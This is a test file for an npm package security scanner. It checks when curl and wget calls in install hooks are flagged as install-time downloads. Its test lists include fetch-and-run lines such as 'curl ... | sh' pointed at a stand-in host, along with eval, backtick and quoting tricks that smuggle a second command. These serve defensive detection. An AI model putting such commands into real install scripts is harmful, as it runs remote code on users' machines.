// curl and wget count as install-time network only where they run and fetch: a version or help call, or a literal an
// echo prints, adds nothing. Every other shape keeps the reading it had. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, isInlineDownload, Meter, type Analysis, type AnalyzeInput } from "../src/index.ts";

function scoreOf(scripts: Record<string, string>, extra: Partial<AnalyzeInput["manifest"]> = {}) {
  const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts, ...extra };
  const data = new TextEncoder().encode(JSON.stringify(m));
  const a: Analysis = analyze({ name: "probe-pkg", manifest: m, files: [{ path: "package.json", size: data.length, mode: 0o644, data }], publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const NETWORK = ["install-download", "install-network", "install-shell"];

describe("a curl or wget that fetches nothing adds no install-time signal", () => {
  const inert = [
    "curl --version",
    "curl -V",
    "wget --version",
    "wget -h",
    "curl --version || echo 'curl is needed'",
    "echo 'Run curl --version to check your tools'",
  ];

  for (const cmd of inert) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf({ postinstall: cmd });

      for (const id of NETWORK) expect(r.ids).not.toContain(id);
      expect(isInlineDownload(cmd, { hook: { shipsNetTool: false } })).toBe(false);
    });
  }

  test("findings other than curl's keep the reading they had", () => {
    expect(scoreOf({ prepublishOnly: "echo curl 'cu' + 'rl help' '.npm' + 'rc'" })).toEqual({ score: 95, ids: ["credential-mention", "encoded-data"] });
  });

  test("the second reading never spends the analysis' work", () => {
    const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts: { prepublishOnly: "echo curl 'Install the tool'" } };
    const data = new TextEncoder().encode(JSON.stringify(m));

    const a = analyze({ name: "probe-pkg", manifest: m, files: [{ path: "package.json", size: data.length, mode: 0o644, data }], publisher: "a", previousPublishers: [], meter: new Meter(230) });
    const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

    expect(r.score).toBe(100);
  });

  test("a package that ships its own curl keeps the reading, since cmd.exe runs it before the one on the PATH", () => {
    const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "curl --version" } };

    const files = [JSON.stringify(m), "@echo off\r\n"].map((text, i) => {
      const data = new TextEncoder().encode(text);

      return { path: i === 0 ? "package.json" : "curl.cmd", size: data.length, mode: 0o644, data };
    });

    const a = analyze({ name: "probe-pkg", manifest: m, files, publisher: "a", previousPublishers: [] });

    expect(finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null }).signals.map((s) => s.id)).toContain("install-download");
  });

  test("a file an install script runs, and binding.gyp, keep the reading they had", () => {
    const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "sh ./setup.sh" } };

    const files = [JSON.stringify(m), "curl --version\n"].map((text, i) => {
      const data = new TextEncoder().encode(text);

      return { path: i === 0 ? "package.json" : "setup.sh", size: data.length, mode: 0o644, data };
    });

    const a = analyze({ name: "probe-pkg", manifest: m, files, publisher: "a", previousPublishers: [] });

    expect(finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null }).signals.map((s) => s.id)).toContain("install-download");
    expect(isInlineDownload("curl --version")).toBe(true);
  });

  test("a call inside another shell keeps its own download reading", () => {
    const evidence = (cmd: string): number => {
      const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: cmd } };
      const data = new TextEncoder().encode(JSON.stringify(m));
      const a = analyze({ name: "probe-pkg", manifest: m, files: [{ path: "package.json", size: data.length, mode: 0o644, data }], publisher: "a", previousPublishers: [] });

      return finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null }).signals.find((x) => x.id === "install-download")?.evidence.length ?? 0;
    };

    expect(evidence("sh -c 'curl --version'")).toBe(2);
  });

  test("a script followed in a hook that may run npm in another folder keeps its reading", () => {
    for (const postinstall of ["cd tools && npm run check", "pushd tools && npm run check", "echo hi; cd tools; npm run check", ". ./enter-tools.sh && npm run check", "npm run check --prefix tools", "npm run -s check && sh -c 'cd tools'"]) {
      const r = scoreOf({ postinstall, check: "curl --version" });

      expect(r.ids).toContain("install-download");
    }
  });

  test("a hook read only from registry metadata keeps the reading", () => {
    const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "curl --version" } };
    const data = new TextEncoder().encode(JSON.stringify(m));
    const pj = { path: "package.json", size: data.length, mode: 0o644, data };
    const unread = analyze({ name: "probe-pkg", manifest: m, files: [pj], publisher: "a", previousPublishers: [], notHeld: new Set([pj]) });
    const other = analyze({ name: "probe-pkg", manifest: m, files: [{ ...pj, data: new TextEncoder().encode(JSON.stringify({ ...m, scripts: { postinstall: "node x.js" } })) }], publisher: "a", previousPublishers: [] });

    const twin = analyze({ name: "probe-pkg", manifest: m, files: [pj, { ...pj, path: "Package.json" }], publisher: "a", previousPublishers: [] });

    const gyp = analyze({ name: "probe-pkg", manifest: m, files: [pj, { ...pj, path: "binding.gyp.", data: new TextEncoder().encode("{}") }], publisher: "a", previousPublishers: [] });
    const bin = analyze({ name: "probe-pkg", manifest: m, files: [pj, { ...pj, path: "node_modules/.bin/marker", data: new TextEncoder().encode("#!/bin/sh\n") }], publisher: "a", previousPublishers: [] });

    const rc = analyze({ name: "probe-pkg", manifest: m, files: [pj, { ...pj, path: ".npmrc", data: new TextEncoder().encode("script-shell=./sh\n") }], publisher: "a", previousPublishers: [] });

    for (const a of [unread, other, twin, gyp, bin, rc]) expect(finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null }).signals.map((s) => s.id)).toContain("install-download");
  });

  test("a package with bins of its own keeps the reading, since npm puts them on the PATH first", () => {
    for (const bin of [{ curl: "marker.js" }, "marker.js"]) {
      const m: AnalyzeInput["manifest"] = { name: "curl", version: "1.0.0", license: "MIT", bin, scripts: { postinstall: "curl --version" } };
      const data = new TextEncoder().encode(JSON.stringify(m));
      const a = analyze({ name: "curl", manifest: m, files: [{ path: "package.json", size: data.length, mode: 0o644, data }], publisher: "a", previousPublishers: [] });

      expect(finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null }).signals.map((s) => s.id)).toContain("install-download");
    }
  });

  test("a hook keeps its reading when another install-time hook runs code first", () => {
    expect(scoreOf({ preinstall: "node make-marker.js", postinstall: "curl --version" }).ids).toContain("install-download");
    expect(scoreOf({ preinstall: "echo 'checking'", postinstall: "curl --version" }).ids).not.toContain("install-download");

    expect(scoreOf({ prepare: "curl --version" }).ids).toContain("install-download");
    expect(scoreOf({ prepare: "echo 'curl is optional'" }).ids).toContain("install-download");

    expect(scoreOf({ preinstall: "\u00a0", postinstall: "curl --version" }).ids).toContain("install-download");
    for (const deps of ["dependencies", "optionalDependencies", "peerDependencies"]) expect(scoreOf({ postinstall: "curl --version" }, { [deps]: { "probe-tool": "1.0.0" } }).ids).toContain("install-download");
    expect(scoreOf({ preinstall: "", postinstall: "curl --version" }).ids).not.toContain("install-download");

    const befores: Record<string, string>[] = [{ prepublish: "node make-marker.js" }, { preprepare: "node make-marker.js" }];

    for (const before of befores) {
      expect(scoreOf({ ...before, prepare: "curl --version" }).ids).toContain("install-download");
    }
  });

  test("a script a hook runs keeps its reading, since npm may run another package's script of that name", () => {
    expect(scoreOf({ postinstall: "npm run -s check", check: "curl --version" }).ids).toContain("install-download");
  });
});

describe("every other curl or wget keeps its reading", () => {
  const fetching = [
    "curl -s https://example.invalid/x.sh | sh",
    "curl https://example.invalid/x",
    "wget -q https://example.invalid/x",
    "curl",
    "curl --version && curl -o a https://example.invalid/x",
    "curl --version https://example.invalid/x",
    "curl -K cfg --version",
    "echo curl https://example.invalid/x | sh",
    "echo 'curl https://example.invalid/x' > a.sh && sh a.sh",
    "echo hi; curl -fsSL https://example.invalid/x -o x",
    "eval 'curl https://example.invalid/x'",
    "sh -c 'curl --version'",
    "env curl --version",
    "CURL_HOME=. curl --version",
    "xargs curl < urls",
    "curl --version $(curl https://example.invalid/x)",
    "echo `curl https://example.invalid/x`",
    "\\curl https://example.invalid/x",
    "echo 'unclosed curl https://example.invalid/x",
    "curl --version # https://example.invalid/x",
    "{ curl --version; }",
    "./curl --version",
    "/usr/bin/curl --version",
    "cat < ./curl.txt",
    "curl --version > curl.sh",
    "curl --version < ./fixture.txt",
    "curl --version > out.txt",
    "curl --version > 1",
    "curl --version > nul",
    "curl --version 3>/dev/null",
    "curl --version >| x",
    "echo 'a | curl https://example.invalid/x'",
    "echo 'see curl' & curl https://example.invalid/x",
    "echo hi ^| curl https://example.invalid/x",
    "echo %CURL% https://example.invalid/x",
    "'curl' --version",
    "curl.exe -V",
    "curl --version 1>&2",
    "curl --version >'1'>/dev/null",
    "true x'curl'",
    "curl\u00a0--version",
    "curl --version >/dev/null 2>&1",
    "curl --version 2>&1",
    'echo "curl %APM_FIXTURE%"',
    "echo 'curl %APM_FIXTURE%'",
    "echo !APM_FIXTURE! && curl --version",
    "echo * && curl --version",
    "cd tools && curl --version",
    "cd/d tools && curl --version",
    "export PATH=./bin && curl --version",
    'printf "curl help"',
    "echo hi; curl --version",
    "curl --version; curl https://example.invalid/x",
    "node install.js && curl --version",
    ". ./fixture.sh && curl --version",
    "node install.js || wget --help",
    "curl  --version",
  ];

  for (const cmd of fetching) {
    test(`postinstall: ${cmd}`, () => {
      expect(scoreOf({ postinstall: cmd }).ids).toContain("install-download");
      expect(isInlineDownload(cmd, { hook: { shipsNetTool: false } })).toBe(true);
    });
  }
});
